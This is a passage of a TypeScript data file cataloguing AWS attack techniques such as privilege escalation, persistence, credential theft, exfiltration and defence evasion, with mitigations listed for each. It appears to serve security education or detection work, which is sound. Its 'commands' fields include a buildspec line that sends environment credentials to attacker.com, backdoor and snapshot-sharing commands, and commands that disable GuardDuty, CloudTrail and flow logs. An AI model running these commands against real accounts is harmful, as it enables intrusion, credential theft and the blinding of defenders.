      "An attacker with lambda:UpdateFunctionConfiguration or lambda:UpdateFunctionCode can modify a Lambda function to steal credentials or execute malicious code. UpdateFunctionConfiguration can add environment variables that exfiltrate data, change the function's role, or modify VPC settings. UpdateFunctionCode replaces the function's code with attacker-controlled code that runs with the function's IAM role. The attacker then invokes the function to execute their code. Required permissions are lambda:UpdateFunctionConfiguration and/or lambda:UpdateFunctionCode.",
    services: ["Lambda"],
    permissions: ["lambda:UpdateFunctionConfiguration", "lambda:UpdateFunctionCode"],
    detectionIds: [],
    mitigations: ["Restrict Lambda updates", "Use immutable deployments", "Audit configuration changes"],
    category: "privilege-escalation",
    commands: [
      "aws lambda update-function-configuration --function-name TargetFunction --environment 'Variables={EXFIL=http://attacker.com}'",
      "aws lambda update-function-code --function-name TargetFunction --zip-file fileb://malicious.zip",
    ],
  },
  {
    id: "tech-lambda-backdoor",
    name: "Lambda Resource Policy Backdoor",
    shortName: "Lambda Backdoor",
    description:
      "An attacker with lambda:AddPermission adds a resource-based policy statement to a Lambda function that allows an external principal (e.g., attacker account root or a specific user) to invoke the function. The Lambda may already have privileged code or the attacker may have updated it. The attacker can now invoke the function from their account at any time, creating a persistent backdoor. Required permission is lambda:AddPermission. The attacker specifies the principal and action (lambda:InvokeFunction).",
    services: ["Lambda", "IAM"],
    permissions: ["lambda:AddPermission"],
    detectionIds: ["det-005"],
    mitigations: ["Restrict AddPermission", "Audit Lambda resource policies", "Use private functions"],
    category: "persistence",
    commands: [
      "aws lambda add-permission --function-name TargetFunction --statement-id BackdoorAccess --action lambda:InvokeFunction --principal 999888777666",
    ],
  },
  {
    id: "tech-ecs-task-credential-theft",
    name: "ECS Task Role Credential Theft",
    shortName: "ECS Cred Theft",
    description:
      "ECS tasks receive IAM credentials via the task role. These are available inside the container at the metadata endpoint (169.254.170.2 for ECS, or the container-specific endpoint). An attacker with code execution in a container (e.g., via RCE, vulnerable application, or compromised image) can curl the metadata endpoint to retrieve the task role's temporary credentials. The credentials allow the attacker to perform any action the task role permits. No additional AWS permissions are required; the attacker only needs execution in the container.",
    services: ["ECS", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use least-privilege task roles", "Restrict container capabilities", "Monitor ECS task credential access"],
    category: "credential-access",
    commands: [
      "curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI (from within container)",
      "Or: curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
    ],
  },
  {
    id: "tech-ecs-task-definition-backdoor",
    name: "ECS Task Definition Backdoor",
    shortName: "ECS Backdoor",
    description:
      "An attacker with ecs:RegisterTaskDefinition creates a new task definition that uses a malicious container image or overrides the entrypoint to run attacker code. When ecs:UpdateService deploys this task definition to a service, the attacker's code runs in the cluster with the task role's permissions. The attacker can exfiltrate credentials, access AWS resources, or establish persistence. Required permissions are ecs:RegisterTaskDefinition and ecs:UpdateService. The task role may have broad permissions if not properly scoped.",
    services: ["ECS", "IAM"],
    permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
    detectionIds: ["det-027"],
    mitigations: ["Restrict RegisterTaskDefinition", "Use image signing", "Audit task definition changes"],
    category: "privilege-escalation",
    commands: [
      "aws ecs register-task-definition --family backdoor --container-definitions '[{\"name\":\"app\",\"image\":\"attacker/backdoor:latest\",\"essential\":true}]' --task-role-arn arn:aws:iam::ACCOUNT:role/AdminRole",
      "aws ecs update-service --cluster prod --service web-app --task-definition backdoor:1",
    ],
  },
  {
    id: "tech-s3-acl-persistence",
    name: "S3 ACL Persistence",
    shortName: "S3 ACL",
    description:
      "An attacker with s3:PutObjectAcl or s3:PutBucketAcl can set ACLs that grant them or their principal access to objects or the bucket. For example, they add an ACL grant that gives their account or user full control. Even if IAM policies are later modified to revoke access, the ACL grant may still allow access. Object ACLs (e.g., bucket-owner-full-control) can persist cross-account access. Required permissions are s3:PutObjectAcl for objects or s3:PutBucketAcl for the bucket. ACLs must be enabled (not BucketOwnerEnforced).",
    services: ["S3"],
    permissions: ["s3:PutObjectAcl", "s3:PutBucketAcl"],
    detectionIds: [],
    mitigations: ["Disable ACLs (Object Ownership: BucketOwnerEnforced)", "Monitor ACL changes", "Use bucket policies"],
    category: "persistence",
    commands: [
      "aws s3api put-object-acl --bucket target-bucket --key sensitive-file --acl bucket-owner-full-control --grant-full-control id=AttackerCanonicalId",
    ],
  },
  {
    id: "tech-codebuild-env-theft",
    name: "CodeBuild Environment Credential Theft",
    shortName: "CodeBuild Env",
    description:
      "CodeBuild projects can have environment variables that contain credentials or reference Parameter Store/Secrets Manager. An attacker who can trigger a build (or modify the buildspec) injects code that exfiltrates these credentials during the build. The build runs with the CodeBuild service role; environment variables are available to the build process. The attacker may use a malicious buildspec or modify an existing project's build to run curl or similar to send credentials to an external server. No additional AWS permissions if they can trigger builds; otherwise codebuild:StartBuild.",
    services: ["CodeBuild", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Avoid secrets in env vars", "Use Secrets Manager with least-privilege", "Audit CodeBuild projects"],
    category: "credential-access",
    commands: [
      "Modify buildspec to add: curl http://attacker.com/exfil?creds=$(env | base64)",
      "aws codebuild start-build --project-name TargetProject",
    ],
  },
  {
    id: "tech-beanstalk-env-theft",
    name: "Elastic Beanstalk Environment Credential Theft",
    shortName: "Beanstalk Env",
    description:
      "Elastic Beanstalk environment configurations store environment variables that may contain database credentials, API keys, or IAM credentials. An attacker with elasticbeanstalk:DescribeConfigurationSettings retrieves the configuration for an environment, including option settings that contain sensitive values. The RDS connection string and other secrets are often stored here. Required permission is elasticbeanstalk:DescribeConfigurationSettings. The attacker specifies the application and environment names.",
    services: ["Elastic Beanstalk", "IAM"],
    permissions: ["elasticbeanstalk:DescribeConfigurationSettings"],
    detectionIds: [],
    mitigations: ["Avoid secrets in env config", "Use Secrets Manager", "Restrict DescribeConfigurationSettings"],
    category: "credential-access",
    commands: [
      "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name my-env",
    ],
  },
  {
    id: "tech-beanstalk-credential-pivot",
    name: "Beanstalk Credential Pivot",
    shortName: "Beanstalk Pivot",
    description:
      "After stealing credentials from an Elastic Beanstalk environment (e.g., the instance profile or IAM user credentials in env vars), the attacker uses those credentials to perform privileged actions. If the credentials have iam:CreateAccessKey, the attacker creates access keys for themselves or a backdoor user. If they have sts:AssumeRole, they assume higher-privilege roles. This pivots from read-only environment access to persistent or escalated access. Required permissions depend on what the stolen credentials allow; commonly iam:CreateAccessKey.",
    services: ["Elastic Beanstalk", "IAM"],
    permissions: ["iam:CreateAccessKey"],
    detectionIds: [],
    mitigations: ["Least-privilege instance profiles", "Restrict CreateAccessKey", "Audit Beanstalk role usage"],
    category: "lateral-movement",
    commands: [
      "aws iam create-access-key --user-name TargetUser (using stolen credentials)",
    ],
  },
  {
    id: "tech-cognito-identity-pool-creds",
    name: "Cognito Identity Pool Credential Access",
    shortName: "Identity Pool",
    description:
      "Cognito Identity Pools can be configured to allow unauthenticated access, granting temporary AWS credentials to anyone who requests them. The attacker calls GetCredentialsForIdentity (or the equivalent in the SDK) with an unauthenticated identity or a weakly authenticated one. The returned credentials are scoped to an IAM role. If that role is overprivileged (e.g., has S3 read, Lambda invoke), the attacker gains access without prior AWS credentials. Required: ability to call the Cognito Identity Pool API (often from a public app); no AWS permissions if unauthenticated access is enabled.",
    services: ["Cognito"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use authenticated identity pools", "Restrict unauthenticated access", "Audit GetCredentialsForIdentity"],
    category: "credential-access",
    commands: [
      "aws cognito-identity get-credentials-for-identity --identity-id us-east-1:xxx",
    ],
  },
  {
    id: "tech-oidc-trust-misconfig",
    name: "OIDC Trust Policy Misconfiguration",
    shortName: "OIDC Misconfig",
    description:
      "IAM roles can trust OIDC identity providers (e.g., GitHub, GitLab) for federated access. If the trust policy is misconfigured with broad conditions (e.g., only checking aud, or using a wildcard in sub), an attacker can satisfy the conditions from an attacker-controlled repository or identity. The attacker forks a target repo, adds a workflow that requests OIDC tokens, and uses those tokens to assume the role via sts:AssumeRoleWithWebIdentity. No prior AWS credentials needed. The trust policy must allow the attacker's OIDC claims.",
    services: ["IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use strict OIDC conditions (aud, sub)", "Verify IdP URLs", "Audit OIDC trust policies"],
    category: "initial-access",
    commands: [
      "GitHub Actions: uses id-token: write, then aws-actions/configure-aws-credentials@v2 with role-to-assume",
    ],
  },
  {
    id: "tech-cognito-self-signup",
    name: "Cognito User Pool Self-Signup",
    shortName: "Cognito SignUp",
    description:
      "When a Cognito User Pool has self-signup enabled (SignUp API allowed), anyone can create an account with a valid email and password. An attacker registers with a disposable or controlled email and gains access to the application protected by the User Pool. Depending on the app's authorization, they may access resources intended for legitimate users. No AWS credentials required; the attacker uses the application's signup flow or the Cognito SignUp API directly. This is a common misconfiguration for initial access.",
    services: ["Cognito"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Disable self-signup", "Use admin-only user creation", "Implement invite flows"],
    category: "initial-access",
    commands: [
      "aws cognito-idp sign-up --client-id xxx --username attacker@email.com --password 'P@ssw0rd!'",
    ],
  },
  {
    id: "tech-cloudfront-origin-takeover",
    name: "CloudFront Orphaned Origin Takeover",
    shortName: "Origin Takeover",
    description:
      "When a CloudFront distribution uses an S3 bucket as its origin and that bucket is deleted, the distribution becomes orphaned. The origin domain (e.g., bucket.s3.amazonaws.com) may still resolve. An attacker creates a new S3 bucket with the same name. CloudFront will then serve content from the attacker's bucket to visitors of the distribution. The attacker can serve phishing pages, malware, or capture credentials. Required permission is s3:CreateBucket. The bucket name must be available (the original was deleted).",
    services: ["CloudFront", "S3"],
    permissions: ["s3:CreateBucket"],
    detectionIds: [],
    mitigations: ["Use custom domain origins", "Reserve bucket names", "Audit CloudFront distributions"],
    category: "initial-access",
    commands: [
      "aws s3 mb s3://deleted-bucket-name (recreate deleted bucket)",
    ],
  },
  {
    id: "tech-resource-policy-misconfig",
    name: "Resource Policy Misconfiguration Abuse",
    shortName: "Resource Policy",
    description:
      "S3 buckets, Lambda functions, and other resources can have resource-based policies that grant access. Misconfigurations such as Principal: '*' or overly broad account allowlists enable access without prior AWS credentials. An attacker discovers these misconfigured resources (via enumeration, public disclosure, or scanning) and accesses them. For S3, they use s3:GetObject; for Lambda, lambda:InvokeFunction. The attacker may use the AWS CLI, SDK, or curl with pre-signed URLs. No IAM credentials needed if the resource policy allows anonymous or broad access.",
    services: ["S3", "Lambda", "IAM"],
    permissions: ["s3:GetObject", "lambda:InvokeFunction"],
    detectionIds: ["det-017", "det-018"],
    mitigations: ["Avoid Principal *", "Use least-privilege resource policies", "Audit with Access Analyzer"],
    category: "initial-access",
    commands: [
      "aws s3 cp s3://misconfigured-bucket/sensitive-file . (if policy allows)",
      "aws lambda invoke --function-name misconfigured-function output.json",
    ],
  },
  {
    id: "tech-bedrock-agent-hijacking",
    name: "Bedrock Agent Hijacking",
    shortName: "Bedrock Hijack",
    description:
      "Bedrock agents use Lambda functions for custom logic. An attacker with bedrock:UpdateAgent and lambda:UpdateFunctionCode modifies the agent to use a malicious Lambda. When the agent is invoked (via InvokeAgent API or an application), the malicious Lambda runs with the agent's IAM role permissions. The attacker can exfiltrate credentials, access resources, or perform privileged actions. Required permissions are bedrock:UpdateAgent (to point to a modified Lambda) and lambda:UpdateFunctionCode (to replace the Lambda code).",
    services: ["Bedrock", "Lambda"],
    permissions: ["bedrock:UpdateAgent", "lambda:UpdateFunctionCode"],
    detectionIds: [],
    mitigations: ["Restrict agent updates", "Audit agent configurations", "Use immutable agent versions"],
    category: "privilege-escalation",
    commands: [
      "aws lambda update-function-code --function-name AgentLambda --zip-file fileb://malicious.zip",
      "aws bedrock update-agent --agent-id xxx --agent-name hijacked-agent",
    ],
  },
  {
    id: "tech-bedrock-invoke-model",
    name: "Bedrock InvokeModel Abuse",
    shortName: "Bedrock Invoke",
    description:
      "An attacker with bedrock:InvokeModel can send prompts to Bedrock foundation models. They may use prompt injection to extract training data, bypass guardrails, or cause the model to output sensitive information. The model's output could be used to exfiltrate data by encoding it in the response. The attacker could also abuse the API for data exfiltration by including sensitive context in prompts and having the model summarize or relay it. Required permission is bedrock:InvokeModel. Usage is billed to the account.",
    services: ["Bedrock"],
    permissions: ["bedrock:InvokeModel"],
    detectionIds: [],
    mitigations: ["Restrict InvokeModel", "Monitor model usage", "Use guardrails"],
    category: "exfiltration",
    commands: [
      "aws bedrock-runtime invoke-model --model-id anthropic.claude-v2 --body '{\"prompt\":\"...\"}' output.json",
    ],
  },
  {
    id: "tech-backup-enumeration",
    name: "AWS Backup Service Enumeration",
    shortName: "Backup Enum",
    description:
      "An attacker with backup:DescribeRecoveryPoint and backup:StartRestoreJob can enumerate recovery points (backups) and restore them to extract data. They list recovery points for protected resources (e.g., EBS volumes, RDS), then start a restore job to restore the backup to a location they control. Once restored, they mount volumes or access databases to extract credentials and sensitive data. Required permissions include backup:DescribeRecoveryPoint, backup:StartRestoreJob, and possibly backup:ListRecoveryPointsByResource.",
    services: ["Backup"],
    permissions: ["backup:DescribeRecoveryPoint", "backup:StartRestoreJob"],
    detectionIds: [],
    mitigations: ["Restrict backup access", "Encrypt recovery points", "Audit restore jobs"],
    category: "credential-access",
    commands: [
      "aws backup list-recovery-points-by-resource --resource-arn arn:aws:ec2:region::volume/vol-xxx",
      "aws backup start-restore-job --recovery-point-arn arn:aws:backup:region:account:recovery-point:xxx --iam-role-arn arn:aws:iam::account:role/restore-role --metadata VolumeId=vol-target",
    ],
  },
  {
    id: "tech-access-key-decode",
    name: "Access Key Account ID Decode",
    shortName: "Key Decode",
    description:
      "AWS access key IDs (e.g., AKIA...) encode the account ID in a predictable format. By decoding the key ID, an attacker can determine which AWS account the key belongs to. This is useful for reconnaissance when the attacker has found a key (e.g., in a leak, log, or config) and wants to target the correct account. No AWS API permissions are required; decoding uses public algorithms. The key format has been documented in AWS security bulletins.",
    services: ["IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["N/A - public metadata", "Use access key format awareness in detection"],
    category: "credential-access",
    commands: [
      "Decode AKIAIOSFODNN7EXAMPLE to extract account ID (use public key decode tools)",
    ],
  },
  {
    id: "tech-guardduty-detector-evasion",
    name: "GuardDuty Detector Modification",
    shortName: "GuardDuty Evasion",
    description:
      "An attacker with guardduty:UpdateDetector can disable a GuardDuty detector or reduce its sensitivity, evading detection of subsequent malicious activity. guardduty:DeleteDetector removes the detector entirely. Detectors are regional; the attacker may need to modify detectors in multiple regions. Required permissions are guardduty:UpdateDetector to set enable to false, or guardduty:DeleteDetector to remove the detector.",
    services: ["GuardDuty"],
    permissions: ["guardduty:UpdateDetector", "guardduty:DeleteDetector"],
    detectionIds: [],
    mitigations: ["Restrict GuardDuty management", "Use delegated admin", "Alert on detector changes"],
    category: "defense-evasion",
    commands: [
      "aws guardduty update-detector --detector-id xxx --enable false",
      "aws guardduty delete-detector --detector-id xxx",
    ],
  },
  {
    id: "tech-guardduty-ip-trust-evasion",
    name: "GuardDuty IP Trust List Evasion",
    shortName: "IP Trust List",
    description:
      "GuardDuty allows trusted IP lists that suppress findings from specified IP ranges. An attacker with guardduty:CreateIPSet or guardduty:UpdateIPSet adds their IP or CIDR range to a trusted list. Findings from that IP are then suppressed. The attacker creates a new IP set or updates an existing one with their address. Required permissions are guardduty:CreateIPSet and guardduty:UpdateIPSet. The IP set must be associated with the detector.",
    services: ["GuardDuty"],
    permissions: ["guardduty:CreateIPSet", "guardduty:UpdateIPSet"],
    detectionIds: [],
    mitigations: ["Restrict trusted IP management", "Audit IP set changes", "Use delegated admin"],
    category: "defense-evasion",
    commands: [
      "aws guardduty create-ip-set --detector-id xxx --name TrustedIPs --format TXT --location s3://bucket/ips.txt --activate",
    ],
  },
  {
    id: "tech-guardduty-event-rules-evasion",
    name: "GuardDuty EventBridge Rule Evasion",
    shortName: "EventBridge Rules",
    description:
      "GuardDuty findings are often forwarded to SIEM or SNS via EventBridge rules. An attacker with events:DeleteRule removes the rule that forwards GuardDuty findings, suppressing alerting. Alternatively, events:PutRule and events:PutTargets can modify the rule to point to a dead target or filter out findings. Required permissions are events:DeleteRule to remove the rule, or events:PutRule and events:PutTargets to modify it.",
    services: ["GuardDuty", "EventBridge"],
    permissions: ["events:DeleteRule", "events:PutRule", "events:PutTargets"],
    detectionIds: [],
    mitigations: ["Restrict EventBridge rule management", "Use SNS for findings", "Audit rule changes"],
    category: "defense-evasion",
    commands: [
      "aws events delete-rule --name GuardDutyFindingsRule",
    ],
  },
  {
    id: "tech-guardduty-suppression",
    name: "GuardDuty Filter Suppression",
    shortName: "Filter Suppression",
    description:
      "GuardDuty filters allow suppressing or archiving findings that match certain criteria. An attacker with guardduty:CreateFilter or guardduty:UpdateFilter creates or modifies a filter that matches their activity (e.g., by finding type, severity, or resource). Matching findings are suppressed or archived, reducing visibility. Required permissions are guardduty:CreateFilter and guardduty:UpdateFilter. The filter must be activated.",
    services: ["GuardDuty"],
    permissions: ["guardduty:CreateFilter", "guardduty:UpdateFilter"],
    detectionIds: [],
    mitigations: ["Restrict filter management", "Audit filter changes", "Use delegated admin"],
    category: "defense-evasion",
    commands: [
      "aws guardduty create-filter --detector-id xxx --name SuppressFindings --finding-criteria '{\"Criterion\":{\"service.additionalInfo.threatName\":{\"Eq\":[\"Backdoor\"]}}}' --action ARCHIVE",
    ],
  },
  {
    id: "tech-guardduty-publishing-evasion",
    name: "GuardDuty Publishing Destination Deletion",
    shortName: "Publishing Evasion",
    description:
      "GuardDuty can publish findings to S3 or EventBridge. An attacker with guardduty:DeletePublishingDestination removes the publishing destination, stopping findings from reaching the SIEM or S3 bucket. guardduty:UpdatePublishingDestination can modify the destination to point elsewhere or disable it. Required permissions are guardduty:DeletePublishingDestination or guardduty:UpdatePublishingDestination. This blinds the security team to GuardDuty findings.",
    services: ["GuardDuty"],
    permissions: ["guardduty:DeletePublishingDestination", "guardduty:UpdatePublishingDestination"],
    detectionIds: [],
    mitigations: ["Restrict publishing destination management", "Use delegated admin", "Alert on destination changes"],
    category: "defense-evasion",
    commands: [
      "aws guardduty delete-publishing-destination --detector-id xxx --destination-id xxx",
    ],
  },
  {
    id: "tech-cloudtrail-config-update",
    name: "CloudTrail Configuration Update",
    shortName: "CloudTrail Config",
    description:
      "An attacker with cloudtrail:UpdateTrail can modify a trail's configuration to evade logging. They may disable the trail (IsMultiRegionTrail=false and pointing to a different region), change the S3 bucket to one they control, or modify other settings. cloudtrail:PutEventSelectors can reduce which events are logged. Required permissions are cloudtrail:UpdateTrail and optionally cloudtrail:PutEventSelectors. This degrades or eliminates audit trail coverage.",
    services: ["CloudTrail"],
    permissions: ["cloudtrail:UpdateTrail", "cloudtrail:PutEventSelectors"],
    detectionIds: [],
    mitigations: ["Restrict CloudTrail updates", "Use organization trail", "Alert on trail changes"],
    category: "defense-evasion",
    commands: [
      "aws cloudtrail update-trail --name management-trail --no-is-multi-region-trail",
      "aws cloudtrail put-event-selectors --trail-name management-trail --event-selectors []",
    ],
  },
  {
    id: "tech-cloudtrail-bucket-lifecycle",
    name: "CloudTrail Bucket Lifecycle Modification",
    shortName: "Lifecycle Mod",
    description:
      "An attacker with s3:PutBucketLifecycleConfiguration on the CloudTrail log bucket adds or modifies lifecycle rules to delete objects quickly (e.g., after 1 day) or transition them to Glacier. This reduces the retention of existing logs and limits forensic analysis. The attacker targets the bucket specified in the CloudTrail trail configuration. Required permission is s3:PutBucketLifecycleConfiguration on the CloudTrail bucket.",
    services: ["CloudTrail", "S3"],
    permissions: ["s3:PutBucketLifecycleConfiguration"],
    detectionIds: [],
    mitigations: ["Restrict bucket lifecycle", "Use dedicated logging account", "Enable object lock"],
    category: "defense-evasion",
    commands: [
      "aws s3api put-bucket-lifecycle-configuration --bucket cloudtrail-logs-bucket --lifecycle-configuration file://delete-rule.json",
    ],
  },
  {
    id: "tech-cloudtrail-event-selectors",
    name: "CloudTrail Event Selectors Modification",
    shortName: "Event Selectors",
    description:
      "An attacker with cloudtrail:PutEventSelectors modifies the trail's event selectors to exclude data events (S3, Lambda) or management events. They can set ReadWriteType to ReadOnly to exclude write events, or remove data event selectors entirely. This reduces what is logged without disabling the trail. Required permission is cloudtrail:PutEventSelectors. The trail continues to exist but logs fewer events.",
    services: ["CloudTrail"],
    permissions: ["cloudtrail:PutEventSelectors"],
    detectionIds: [],
    mitigations: ["Restrict PutEventSelectors", "Use organization trail", "Audit event selector changes"],
    category: "defense-evasion",
    commands: [
      "aws cloudtrail put-event-selectors --trail-name management-trail --event-selectors '[{\"ReadWriteType\":\"ReadOnly\",\"IncludeManagementEvents\":true}]'",
    ],
  },
  {
    id: "tech-share-ami",
    name: "AMI Sharing with External Account",
    shortName: "AMI Share",
    description:
      "An attacker with ec2:ModifyImageAttribute can share an AMI with an external account by adding launch permission for that account. The attacker's account then copies the AMI and gains access to the image content, which may include sensitive data, credentials, or malware. Used for exfiltration (stealing image data) or persistence (creating a backdoored AMI in the attacker's account). Required permission is ec2:ModifyImageAttribute with add launchPermission.",
    services: ["EC2"],
    permissions: ["ec2:ModifyImageAttribute"],
    detectionIds: [],
    mitigations: ["Restrict ModifyImageAttribute", "Audit AMI sharing", "Use private AMIs"],
    category: "exfiltration",
    commands: [
      "aws ec2 modify-image-attribute --image-id ami-xxx --launch-permission 'Add=[{UserId=999888777666}]'",
    ],
  },
  {
    id: "tech-share-ebs-snapshot",
    name: "EBS Snapshot Sharing",
    shortName: "EBS Share",
    description:
      "An attacker with ec2:ModifySnapshotAttribute adds create volume permission for an external account (or all accounts via group 'all'). The attacker's account uses ec2:CopySnapshot to copy the snapshot, then creates a volume and mounts it to extract data. This exfiltrates the full contents of the source volume. Unencrypted snapshots are fully readable. Required permission is ec2:ModifySnapshotAttribute. The attacker needs ec2:CopySnapshot in their account.",
    services: ["EC2"],
    permissions: ["ec2:ModifySnapshotAttribute"],
    detectionIds: [],
    mitigations: ["Restrict snapshot sharing", "Encrypt snapshots", "Audit ModifySnapshotAttribute"],
    category: "exfiltration",
    commands: [
      "aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids 999888777666",
    ],
  },
  {
    id: "tech-share-rds-snapshot",
    name: "RDS Snapshot Sharing",
    shortName: "RDS Share",
    description:
      "An attacker with rds:ModifyDBSnapshotAttribute adds restore permission for an external account. The attacker's account uses rds:CopyDBSnapshot to copy the snapshot, then restores it to a new DB instance and extracts database contents. This exfiltrates full database data. Unencrypted snapshots are fully readable. Required permission is rds:ModifyDBSnapshotAttribute. The attacker needs rds:CopyDBSnapshot in their account.",
    services: ["RDS"],
    permissions: ["rds:ModifyDBSnapshotAttribute"],
    detectionIds: [],
    mitigations: ["Restrict RDS snapshot sharing", "Encrypt snapshots", "Audit sharing changes"],
    category: "exfiltration",
    commands: [
      "aws rds modify-db-snapshot-attribute --db-snapshot-identifier rds:snapshot-xxx --attribute-name restore --values-to-add 999888777666",
    ],
  },
  {
    id: "tech-dns-logs-deletion",
    name: "Route53 Resolver Log Deletion",
    shortName: "DNS Logs",
    description:
      "Route53 Resolver can log DNS queries to CloudWatch or S3. An attacker with route53resolver:DeleteResolverQueryLogConfig deletes the query log configuration, stopping DNS query logging. This evades DNS-based detection (e.g., for C2 communication or data exfiltration via DNS). Required permission is route53resolver:DeleteResolverQueryLogConfig. The attacker may also need to disassociate the config from VPCs.",
    services: ["Route53"],
    permissions: ["route53resolver:DeleteResolverQueryLogConfig"],
    detectionIds: [],
    mitigations: ["Restrict resolver log deletion", "Use centralized logging", "Alert on log config changes"],
    category: "defense-evasion",
    commands: [
      "aws route53resolver delete-resolver-query-log-config --resolver-query-log-config-id rqlc-xxx",
    ],
  },
  {
    id: "tech-organizations-leave",
    name: "AWS Organizations Leave",
    shortName: "Org Leave",
    description:
      "A member account can leave an AWS Organization by calling organizations:LeaveOrganization from the member account's root user. This removes the account from SCP coverage, allowing previously blocked actions. The account retains its resources but escapes organizational guardrails. Required permission is organizations:LeaveOrganization; only the member account root can call it. The management account must have enabled account leave in the organization settings.",
    services: ["Organizations"],
    permissions: ["organizations:LeaveOrganization"],
    detectionIds: [],
    mitigations: ["Restrict LeaveOrganization", "Use SCPs to deny leave", "Alert on leave attempts"],
    category: "defense-evasion",
    commands: [
      "aws organizations leave-organization (from member account root)",
    ],
  },
  {
    id: "tech-vpc-flow-logs-removal",
    name: "VPC Flow Logs Removal",
    shortName: "Flow Logs",
    description:
      "An attacker with ec2:DeleteFlowLogs deletes VPC flow log configurations. Flow logs capture network traffic (accepted/rejected) for VPCs, subnets, or ENIs. Deleting them evades network-based detection of malicious traffic (e.g., C2, data exfiltration). Required permission is ec2:DeleteFlowLogs. The attacker specifies the flow log ID. Flow logs may be in CloudWatch Logs or S3.",
    services: ["EC2"],
    permissions: ["ec2:DeleteFlowLogs"],
    detectionIds: [],
    mitigations: ["Restrict DeleteFlowLogs", "Use organization-level flow logs", "Alert on flow log deletion"],
    category: "defense-evasion",
    commands: [
      "aws ec2 delete-flow-logs --flow-log-ids fl-xxx",
    ],
  },
  {
    id: "tech-ses-enumeration",
    name: "SES Identity Enumeration",
    shortName: "SES Enum",
    description:
      "An attacker with ses:ListIdentities and ses:GetIdentityVerificationAttributes enumerates verified email addresses and domains in the account. This reconnaissance supports phishing campaigns (targeting known identities) or credential theft (identifying high-value targets). The attacker may also use ses:ListIdentities to find identities used in other attacks. Required permissions are ses:ListIdentities and ses:GetIdentityVerificationAttributes.",
    services: ["SES"],
    permissions: ["ses:ListIdentities", "ses:GetIdentityVerificationAttributes"],
    detectionIds: [],
    mitigations: ["Restrict SES enumeration", "Audit ListIdentities usage", "Use least-privilege"],
    category: "credential-access",
    commands: [
      "aws ses list-identities --identity-type EmailAddress",
      "aws ses get-identity-verification-attributes --identities user@domain.com",
    ],
  },
  {
    id: "tech-sagemaker-lifecycle-injection",
    name: "SageMaker Lifecycle Config Injection",
    shortName: "SageMaker Lifecycle",
    description:
      "SageMaker notebook instances and training jobs can run lifecycle scripts at startup. An attacker with sagemaker:CreateNotebookInstance or sagemaker:UpdateNotebookInstance sets a lifecycle config that runs malicious code (e.g., to exfiltrate credentials or run reverse shell). The code runs with the notebook/training role's permissions. Required permissions are sagemaker:CreateNotebookInstance or sagemaker:UpdateNotebookInstance with a custom lifecycle config.",
    services: ["SageMaker"],
    permissions: ["sagemaker:CreateNotebookInstance", "sagemaker:UpdateNotebookInstance"],
    detectionIds: [],
    mitigations: ["Restrict lifecycle config", "Audit notebook instances", "Use approved lifecycle scripts"],
    category: "privilege-escalation",
    commands: [
      "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name malicious --on-start Content=$base64_script",
      "aws sagemaker update-notebook-instance --notebook-instance-name target --lifecycle-config-name malicious",
    ],
  },
  {
    id: "tech-eks-access-entry",
    name: "EKS Create Access Entry",
    shortName: "EKS Access",
    description:
      "EKS access entries (replacing aws-auth ConfigMap) control which IAM principals can access the cluster. An attacker with eks:CreateAccessEntry and eks:AssociateAccessPolicy creates an access entry for their principal and associates a policy that grants cluster access (e.g., cluster-admin). They can then use kubectl or the Kubernetes API with their IAM credentials. Required permissions are eks:CreateAccessEntry and eks:AssociateAccessPolicy.",
    services: ["EKS"],
    permissions: ["eks:CreateAccessEntry", "eks:AssociateAccessPolicy"],
    detectionIds: [],
    mitigations: ["Restrict CreateAccessEntry", "Audit access entries", "Use IRSA with least-privilege"],
    category: "privilege-escalation",
    commands: [
      "aws eks create-access-entry --cluster-name prod --principal-arn arn:aws:iam::ACCOUNT:user/attacker",
      "aws eks associate-access-policy --cluster-name prod --principal-arn arn:aws:iam::ACCOUNT:user/attacker --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy --access-scope type=cluster",
    ],
  },
  {
    id: "tech-eventbridge-rule-persistence",
    name: "EventBridge Rule Persistence",
    shortName: "EventBridge Rule",
    description:
      "An attacker with events:PutRule and events:PutTargets creates an EventBridge rule that triggers on a schedule (e.g., rate(5 minutes)) or event pattern. The target is a Lambda function or other resource that runs attacker code. The rule executes automatically without further attacker action, establishing persistence. The attacker may need lambda:AddPermission to allow EventBridge to invoke the Lambda. Required permissions are events:PutRule and events:PutTargets.",
    services: ["EventBridge", "Lambda"],
    permissions: ["events:PutRule", "events:PutTargets"],
    detectionIds: ["det-013"],
    mitigations: ["Restrict PutRule/PutTargets", "Audit EventBridge rules", "Use least-privilege targets"],
    category: "persistence",
    commands: [
      "aws events put-rule --name persistence-rule --schedule-expression 'rate(5 minutes)' --state ENABLED",
      "aws events put-targets --rule persistence-rule --targets 'Id=1,Arn=arn:aws:lambda:region:account:function:backdoor'",
    ],
  },
];

// ─── Lookup helpers ───

export function getTechniqueById(id: string): Technique | undefined {
  return techniques.find((t) => t.id === id);
}

export function getTechniquesByIds(ids: string[]): Technique[] {
  return ids.map((id) => techniques.find((t) => t.id === id)).filter(Boolean) as Technique[];
}

export function getTechniquesByCategory(category: TechniqueCategory): Technique[] {
  return techniques.filter((t) => t.category === category);
}

